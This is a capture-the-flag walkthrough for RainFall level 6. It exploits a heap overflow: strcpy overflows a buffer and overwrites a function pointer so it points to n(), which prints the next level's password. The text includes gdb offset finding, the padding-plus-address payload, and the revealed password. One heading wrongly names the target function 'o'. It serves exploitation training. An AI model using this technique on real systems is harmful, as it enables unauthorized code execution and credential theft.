# Walkthrough for Level 6

## Understanding the Binary

The `level6` binary is vulnerable to a heap overflow attack because it uses the unsafe `strcpy` function to copy user
input into a fixed-size `buffer` without checking the input length. This allows us to overwrite adjacent memory. There
is a `function_pointer` that is initialized to point to the `m` function. There is also an `n` function that reads
level7's password, but this function is never called directly. Since the `buffer` and the `function_pointer` are
allocated sequentially, we can assume they are adjacent in memory. Therefore, if we overflow the `buffer`, we can
overwrite the `function_pointer` to point to the `n` function. When the program calls the function pointer, it will
execute the `n` function instead of the `m` function.

## The address of the `o` function

```shell
┌──(kali㉿kali)-[~/rainfall/level6]
└─$ nm ./level6 | grep "T n"
08048454 T n
```

In little-endian, this address becomes `\x54\x84\x04\x08`.

## Calculating the offset

To find the number of characters that we need to write to reach the `function_pointer`, we will use the same technique
as in [level2](../level2/walkthrough.md). First, we create a long cyclic pattern of 171 characters using
[pwndbg](https://github.com/pwndbg/pwndbg):

```shell
pwndbg> cyclic 171
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa
```

We run the binary within `gdb` and pass the cyclic pattern as a parameter:

```shell
level6@RainFall:~$ gdb ./level6 
...SNIP...
Starting program: /home/user/level6/level6 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa

Program received signal SIGSEGV, Segmentation fault.
0x61616173 in ?? ()

```
We can see that the program crashes with a segmentation fault as it tries to access the invalid address `0x61616173`. 
Converting this address to big endian gives us `0x73616161`, which corresponds to the string `saaa`. This means that
part of the cyclic pattern is stored in the `buffer` variable.

Using the `cyclic -l` command, we can find the offset in the cyclic pattern that corresponds to this value. In this
case, the offset is 72 bytes.

```shell
pwndbg> cyclic -l saaa
Finding cyclic pattern of 4 bytes: b'saaa' (hex: 0x73616161)
Found at offset 72
```

## Crafting the Exploit

Our exploit will consist of 72 characters of padding followed by the address of the `n` function in little-endian format.

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x54\x84\x04\x08

## Running the exploit against the binary

We use the `-e` option of `echo` to interpret escape sequences like `\x` for hexadecimal values, which allows us to pass
the address of the `n` function. We also use `xargs` to pass the exploit as input to the `level6` binary.

```shell
level6@RainFall:~$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x54\x84\x04\x08' | xargs ./level6 
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

This gives us the password for `level7`, which can be used to log in via ssh.
